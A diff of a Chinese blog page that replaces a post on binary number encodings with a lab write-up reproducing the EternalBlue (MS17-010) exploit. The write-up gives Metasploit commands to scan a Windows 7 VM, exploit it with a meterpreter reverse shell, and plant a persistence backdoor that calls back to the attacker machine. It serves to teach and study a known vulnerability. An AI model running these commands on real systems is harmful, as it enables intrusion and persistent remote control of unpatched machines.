@@ -55,20 +55,23 @@
   };
 </script>
 
-  <meta name="description" content="原码反码和补码这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负，0为正，1为负 原码原码的表示法很简单，对于一个二进制数n,  当n为正数时，n的原码是在n上增加一个符号位0 当n为负数时，n的原码是在n上增加一个符号位1 n为0时，在原码中，有两种表示0的方式：0.0000 1.0000  反码对于一个二进制数n  当n为正数时，n的反码和原码">
-<meta name="keywords" content="数字逻辑">
+  <meta name="description" content="前言永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。 基本环境 Kali Linux (IP: 192.168.190.135) Metasploit工具 靶机，MSDN下载的win7  (IP:">
+<meta name="keywords" content="信息安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="原码反码和补码">
-<meta property="og:url" content="https://mingliangliu.com/2019/02/28/原码反码和补码/index.html">
+<meta property="og:title" content="永恒之蓝漏洞复现">
+<meta property="og:url" content="https://mingliangliu.com/2019/08/04/永恒之蓝漏洞复现/index.html">
 <meta property="og:site_name" content="清欢&#39;s Blog">
-<meta property="og:description" content="原码反码和补码这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负，0为正，1为负 原码原码的表示法很简单，对于一个二进制数n,  当n为正数时，n的原码是在n上增加一个符号位0 当n为负数时，n的原码是在n上增加一个符号位1 n为0时，在原码中，有两种表示0的方式：0.0000 1.0000  反码对于一个二进制数n  当n为正数时，n的反码和原码">
+<meta property="og:description" content="前言永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。 基本环境 Kali Linux (IP: 192.168.190.135) Metasploit工具 靶机，MSDN下载的win7  (IP:">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-02-28T09:54:15.726Z">
+<meta property="og:image" content="https://mingliangliu.com/images/永恒之蓝漏洞复现1.PNG">
+<meta property="og:image" content="https://mingliangliu.com/images/永恒之蓝漏洞复现2.PNG">
+<meta property="og:updated_time" content="2019-08-04T10:05:58.108Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="原码反码和补码">
-<meta name="twitter:description" content="原码反码和补码这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负，0为正，1为负 原码原码的表示法很简单，对于一个二进制数n,  当n为正数时，n的原码是在n上增加一个符号位0 当n为负数时，n的原码是在n上增加一个符号位1 n为0时，在原码中，有两种表示0的方式：0.0000 1.0000  反码对于一个二进制数n  当n为正数时，n的反码和原码">
+<meta name="twitter:title" content="永恒之蓝漏洞复现">
+<meta name="twitter:description" content="前言永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。 基本环境 Kali Linux (IP: 192.168.190.135) Metasploit工具 靶机，MSDN下载的win7  (IP:">
+<meta name="twitter:image" content="https://mingliangliu.com/images/永恒之蓝漏洞复现1.PNG">
   <link rel="alternate" href="/atom.xml" title="清欢's Blog" type="application/atom+xml">
-  <link rel="canonical" href="https://mingliangliu.com/2019/02/28/原码反码和补码/">
+  <link rel="canonical" href="https://mingliangliu.com/2019/08/04/永恒之蓝漏洞复现/">
 
 
 <script id="page-configurations">
@@ -82,7 +85,7 @@
   };
 </script>
 
-  <title>原码反码和补码 | 清欢's Blog</title>
+  <title>永恒之蓝漏洞复现 | 清欢's Blog</title>
   
 
 
@@ -223,7 +226,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mingliangliu.com/2019/02/28/原码反码和补码/">
+    <link itemprop="mainEntityOfPage" href="https://mingliangliu.com/2019/08/04/永恒之蓝漏洞复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="清欢">
@@ -237,7 +240,7 @@
       <header class="post-header">
 
         
-          <h2 class="post-title" itemprop="name headline">原码反码和补码
+          <h2 class="post-title" itemprop="name headline">永恒之蓝漏洞复现
 
               
             
@@ -257,7 +260,7 @@
                 
               
 
-              <time title="创建时间：2019-02-28 17:35:08 / 修改时间：17:54:15" itemprop="dateCreated datePublished" datetime="2019-02-28T17:35:08+08:00">2019-02-28</time>
+              <time title="创建时间：2019-08-04 17:07:47 / 修改时间：18:05:58" itemprop="dateCreated datePublished" datetime="2019-08-04T17:07:47+08:00">2019-08-04</time>
             </span>
           
             
@@ -272,7 +275,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/数字逻辑/" itemprop="url" rel="index"><span itemprop="name">数字逻辑</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/信息安全/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a></span>
 
                 
                 
@@ -291,28 +294,44 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="原码反码和补码"><a href="#原码反码和补码" class="headerlink" title="原码反码和补码"></a>原码反码和补码</h1><p>这里我们只讨论有符号数。我们都知道数在机器中都是以二进制表示的，而且常用二进制数的最高位表示其的正负，0为正，1为负</p>
-<h2 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h2><p>原码的表示法很简单，对于一个二进制数n,</p>
-<ul>
-<li>当n为正数时，n的原码是在n上增加一个符号位0</li>
-<li>当n为负数时，n的原码是在n上增加一个符号位1</li>
-<li>n为0时，在原码中，有两种表示0的方式：0.0000 1.0000</li>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。</p>
+<h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><ul>
+<li>Kali Linux (IP: 192.168.190.135)</li>
+<li>Metasploit工具</li>
+<li>靶机，MSDN下载的win7  (IP: 192.168.190.136)</li>
 </ul>
-<h2 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h2><p>对于一个二进制数n</p>
+<p>win7中开启文件共享</p>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>先启动msfconsole，输入如下指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.190.136:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.190.136:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p>从上述结果可知：该win7存在漏洞</p>
+<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>执行如下指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>第一行指令意思是加载Metasploit中的EternalBlue攻击模块，第四行是设置shell的通信类型，payload中装载的是漏洞利用成功后在目标机器上执行的代码</p>
+<p>结果如下：</p>
+<img src="/images/永恒之蓝漏洞复现1.PNG">
+
+<p>执行一下<code>shell</code>指令：</p>
+<img src="/images/永恒之蓝漏洞复现2.PNG">
+
+<p>可以看到，我们已获得目标机器的最高权限的shell</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>metasploit自带的留后门方式有两种：metsvc和persistence，但都有弊端，官方都不推荐使用，这里使用persistence试下</p>
+<p>执行如下指令即可在目标机器中留一个后门：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -U -i 10 -p 4444 -r 192.168.190.135</span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
 <ul>
-<li>当n为正数时，n的反码和原码相同</li>
-<li>当n为负数时，n的反码的符号位为1，数值部分是原码的数值部分按位取反</li>
-<li>在反码表示中，有两种不同形式的0：0.0000 1.1111</li>
+<li>-U：设置后门在用户登录后自启动。</li>
+<li>-i：设置反向连接间隔时间，单位为秒。</li>
+<li>-p：设置反向连接的端口号。</li>
+<li>-r：设置反向连接的ip地址。</li>
 </ul>
-<h2 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h2><p>对于一个二进制数n</p>
-<ul>
-<li>当n为正数时，n的补码和n的原码相同</li>
-<li>当n为负数时，n的补码的符号为为1，数值部分是将原码数值按位取反加1</li>
-<li>当n为0时，在补码表示中，0的表示是唯一的：0.0000</li>
-</ul>
-<blockquote>
-<p>tip: 一个数补码的补码等于这个数</p>
-</blockquote>
+<p>之后可以使用handler模块进行连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>完</p>
 
     </div>
 
@@ -324,13 +343,13 @@
           
         
         <div class="post-tags">
-            <a href="/tags/数字逻辑/" rel="tag"># 数字逻辑</a>
+            <a href="/tags/信息安全/" rel="tag"># 信息安全</a>
           
         </div>
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
-              <a href="/2019/02/09/汇编转移指令/" rel="next" title="汇编转移指令">
-                <i class="fa fa-chevron-left"></i> 汇编转移指令
+              <a href="/2019/04/24/机器学习环境搭建/" rel="next" title="机器学习环境搭建">
+                <i class="fa fa-chevron-left"></i> 机器学习环境搭建
               </a>
             
           </div>
@@ -338,10 +357,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-              <a href="/2019/03/03/汇编语言之标志寄存器/" rel="prev" title="汇编语言之标志寄存器">
-                汇编语言之标志寄存器 <i class="fa fa-chevron-right"></i>
-              </a>
-            
           </div>
         </div>
     </footer>
@@ -506,7 +521,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#原码反码和补码"><span class="nav-number">1.</span> <span class="nav-text">原码反码和补码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原码"><span class="nav-number">1.1.</span> <span class="nav-text">原码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反码"><span class="nav-number">1.2.</span> <span class="nav-text">反码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补码"><span class="nav-number">1.3.</span> <span class="nav-text">补码</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本环境"><span class="nav-number">2.</span> <span class="nav-text">基本环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞探测"><span class="nav-number">3.</span> <span class="nav-text">漏洞探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始攻击"><span class="nav-number">4.</span> <span class="nav-text">开始攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限维持"><span class="nav-number">5.</span> <span class="nav-text">权限维持</span></a></li></ol></div>
             
 
           </div>
